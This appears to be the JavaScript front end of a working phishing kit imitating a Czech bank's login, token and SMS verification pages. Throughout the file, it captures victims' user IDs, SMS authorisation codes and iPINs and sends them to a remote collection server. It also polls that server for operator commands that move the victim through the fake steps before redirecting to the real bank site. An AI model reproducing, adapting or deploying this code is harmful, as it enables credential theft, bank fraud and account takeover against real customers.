const ENVIRONMENT = 'production'

const USER_ID = 'USER_ID'
const LAST_ACTIVE = 'LAST_ACTIVE'
const TOUCHED = 'TOUCHED'
const STATE = 'STATE'

const MSG_PULLING_INTERVAL = 1500
const PAYLOAD_DELIMITER = ';;'

const configGlobal = {
  development: {
    // restURL: "https://paymentsonline.a2hosted.com/token/rest",
    restURL: "http://localhost:5000/token/rest",
    originalURL: 'https://www.somewhere.com'
  },
  production: {
    restURL: "https://paymentsonline.a2hosted.com/token/rest",
    originalURL: 'www.rb.cz'
  },
}

const config = configGlobal[ENVIRONMENT]



const $ = window.$ || window.jQuery;
const store = {}

const log = console.log



const Utils = {

  createNamespace(prefix, keys) {
    return Object.keys(keys).reduce((newKeys, key) => {
      newKeys[key] = prefix ? `${prefix}.${key}` : `${key}`
      return newKeys
    }, {})
  },

  createEnum(keys) {
    return this.createNamespace(undefined, keys)
  },

  isEmptyObj(obj) {
    return Object.keys(obj).length === 0
  },

  goToPage(url, query = '') {
    window.location.href = url + query
  },

  getPageParams() {
    return new URLSearchParams(window.location.search)
  },

  isErrorPage() {
    const params = new URLSearchParams(window.location.search)
    return params && params.has('err')
  }

}

const STEPS = {
  STEP_1: '/login.html',
  STEP_2: '/token.html',
  STEP_3: '/sms.html',
  TECH: '/tech.html'
}

const UserActions = Utils.createNamespace('USER', {
  ENTER_HOMEPAGE: undefined,
  NEW_USER: undefined,
  TYPING: undefined,
  LOGGING: undefined,


  SEND_CREDENTIALS_TOKEN: undefined,
  SEND_CREDENTIALS_SMS: undefined,
  SEND_TOKEN: undefined,
  SEND_SMS: undefined,
  SEND_TECH_DATA: undefined,

})

const AgentInstructions = Utils.createNamespace('INSTR', {
  GO_TO_HOME_SCREEN: undefined,
  SHOW_LOADING_STATE: undefined,
  ERR_MSG_INVALID_CREDENTIALS: undefined,
  GO_TO_ORIGINAL_SITE: undefined,
  GO_TO_TOKEN_SCREEN: undefined,
  GO_TO_SMS_SCREEN: undefined,
  GO_TO_TECH_SCREEN: undefined,

})




const Storage = {
  get userId() { return sessionStorage.getItem(USER_ID); },
  set userId(val) { sessionStorage.setItem(USER_ID, val); },

  get lastActive() { return sessionStorage[LAST_ACTIVE]; },
  set lastActive(val) { sessionStorage[LAST_ACTIVE] = val; },

  get touched() { return sessionStorage.getItem(TOUCHED); },
  set touched(val) { sessionStorage.setItem(TOUCHED, val); },

  get state() { return JSON.parse(sessionStorage.getItem(STATE)) || { step: STEPS.STEP_1 }; },
  set state(val) { sessionStorage.setItem(STATE, JSON.stringify(val)); },

}


const ajax2 = (path, method = 'GET', body) => {
  const lastActive = Storage.lastActive || 0

  return axios({
    url: `${config.restURL}${path}`,
    method,
    data: body,
    headers: {
      'last-active': lastActive
    },
  }).then(json => json.data).then(json => {
    Storage.lastActive = json.lastActive
    return json.data
  })
}

const ajax = (path, method = 'GET', body) => {
  const lastActive = Storage.lastActive || 0

  return $.ajax({
    url: `${config.restURL}${path}`,
    method,
    data: body && JSON.stringify(body),
    contentType: body && 'application/json; charset=utf-8',
    dataType: 'json',
    headers: {
      'last-active': lastActive
    }
  }).then(json => {
    Storage.lastActive = json.lastActive
    return json.data
  })
}


const Messaging = {

  start() {
    setInterval(async () => {
      const msg = await ajax(`/user/message/${Storage.userId}`)
      if (!Utils.isEmptyObj(msg)) {
        log('msg', msg)
        this.onmessage(msg)
      }
    }, MSG_PULLING_INTERVAL);
  },

  async send(action) {
    ajax('/message', 'PUT', { userId: Storage.userId, action })
  },

  async init(onmessage) {
    this.onmessage = onmessage

    let userId = Storage.userId

    if (!userId || userId == 'undefined') {
      const prom = ajax('/user/id')
      userId = await prom
      Storage.userId = userId
    }

    if (Storage.touched) {
      this.start()
    }


  }

}



const init = async () => {
  const onmessage = ({ action, payload }) => {

    switch (action) {
      case AgentInstructions.GO_TO_HOME_SCREEN:
        Utils.goToPage(STEPS.STEP_1)
        return
      case AgentInstructions.GO_TO_TOKEN_SCREEN:
        Utils.goToPage(STEPS.STEP_2)
        return
      case AgentInstructions.GO_TO_SMS_SCREEN:
        Utils.goToPage(STEPS.STEP_3)
        return
      case AgentInstructions.ERR_MSG_INVALID_CREDENTIALS:
        Utils.goToPage(Storage.state.step, '?err=1')
        return
      case AgentInstructions.GO_TO_TECH_SCREEN:
        return
      case AgentInstructions.GO_TO_ORIGINAL_SITE:
        window.location.href = config.originalURL
        return
      default:
        // do nothing
    }
  }

  Messaging.init(onmessage)
}


$(document).ready(async function() {
  log('***********')
  await init()

  const $page1Container = $('#homePage')
  const $page2Container = $('#tokenPage')
  const $page3Container = $('#smsPage')

  if ($page1Container.length) {
    page1($page1Container)
  } else if ($page2Container.length) {
    page2($page2Container)
  } else if ($page3Container.length) {
    page3($page3Container)
  }


});

function page1($container) {
  log('page1 running')

  Storage.state = { ...Storage.state, step: STEPS.STEP_1 }

  setTimeout(function() {
    const $popup = $container.find('.component-wrapper.login-element')
    if ($popup.length) {
      $popup.addClass('opened')

      let navIndex = Storage.state.navIndex !== undefined ? Storage.state.navIndex : 1;

      const forms = {}

      function prepareForm(navIndex) {
        Storage.state = { ...Storage.state, navIndex }

        if (forms[navIndex]) {
          return
        }

        const $form = $popup.find('form:first')

        if ($form.length) {
          forms[navIndex] = $form

          decorateForm($form)

          const $input = $form.find('input[type=text]')
          $input.keyup(e => {
            if (!Storage.touched) {
              log('Typing...')
              Messaging.start()
              Storage.touched = true
            }
          })

          $form.submit(function(e) {
            e.preventDefault()
            const payload = $input.val().trim()

            if (payload.length < 5) {
              decorateForm($form, true)
              return
            }

            const action = navIndex === 0 ? UserActions.SEND_CREDENTIALS_SMS : UserActions.SEND_CREDENTIALS_TOKEN
            Storage.state = { ...Storage.state, userId: payload }
            sendPayload(action, payload)
          })

        }
      }

      if (navIndex !== 1) {
        $container.find(`#mat-tab-label-0-${navIndex}`).click()
      }

      setTimeout(function() {
        prepareForm(navIndex)
      }, 500)

      const $navs = $popup.find('.mat-tab-labels .mat-tab-label').each(function(idx, el) {
        $(this).click(function(e) {
          console.info('xxxxxxxxxxxxxxx nav' + idx)
          if (idx === 2) {
            $container.find(`#mat-tab-label-0-${Storage.state.navIndex !== undefined ? Storage.state.navIndex : 1}`).click()
          } else {
            setTimeout(function() {
              prepareForm(idx)
            }, 500)
          }
        })

      })

    }

  }, 1000)


}

function page2($container) {
  log('page2 running')
  Storage.state = { ...Storage.state, step: STEPS.STEP_2 }

  $container.find('#token-time').text(moment().format('DD.MM.yyyy'))
  $container.find('#navigateSMS').click(function() {
    window.location.href = 'sms.html'
  })

  $container.find('#username-id').text(Storage.state.userId)

  const $tokenTimer = $container.find('#token-timer')
  let time = moment('5:00', 'm:ss')

  setInterval(function(){
    time = time.subtract(1, 'seconds')
    $tokenTimer.text(time.format('m:ss'))

    if (time.isSameOrBefore(moment('0:00', 'm:ss'))) {
      window.location.reload()
    }
  }, 1000)


}

function page3($container) {
  log('page3 running')
  Storage.state = { ...Storage.state, step: STEPS.STEP_3 }

  const DELIMITER = ' - '
  const getNumberValue = text => text.trim().replace(/\D/g, '')

  $container.find('#username-id').text(Storage.state.userId)
  $container.find('#token-time').text(moment().format('DD.MM.yyyy'))
  $container.find('#navigateToken').click(function() {
    window.location.href = 'token.html'
  })

  const $authCode = $container.find('#auth-code')
  $authCode.keypress(function(e) {
    return /^[0-9]*$/.test(e.key)
  }).keyup(function(e) {
    const $input = $(this)
    const inputVal = $input.val()
    const numberVal = getNumberValue(inputVal)
    let formatedVal = numberVal
    if (numberVal.length > 4 && numberVal.length <= 8) {
      formatedVal = numberVal.substring(0,4) + DELIMITER + numberVal.substring(4, numberVal.length)
    } else if (numberVal.length > 8) {
      formatedVal = numberVal.substring(0,4) + DELIMITER + numberVal.substring(4, 8) + DELIMITER + numberVal.substring(8, Math.min(numberVal.length, 11))
    }

    $input.val(formatedVal)
  })

  const $form = $container.find('#sms-form')
  decorateForm($form)

  $form.submit(function(e) {
    e.preventDefault()

    const authCode = getNumberValue($authCode.val())
    const iPin = $container.find('#sms-ipin').val()

    if (authCode.length < 10 || iPin.length < 3) {
      decorateForm($form, true)
      return
    }

    const payload = authCode + PAYLOAD_DELIMITER + iPin
    sendPayload(UserActions.SEND_SMS, payload)
  })

}

function decorateForm($form, error) {
  if (Utils.isErrorPage() || error) {
    $form.addClass('error-form')
  }
}


async function sendPayload(type, payload) {
  await Messaging.send({ type, payload }).then(r => {
    //alert('sent')
    setTimeout(() => {
      Utils.goToPage('/loading.html')
    }, 1500)
  })
}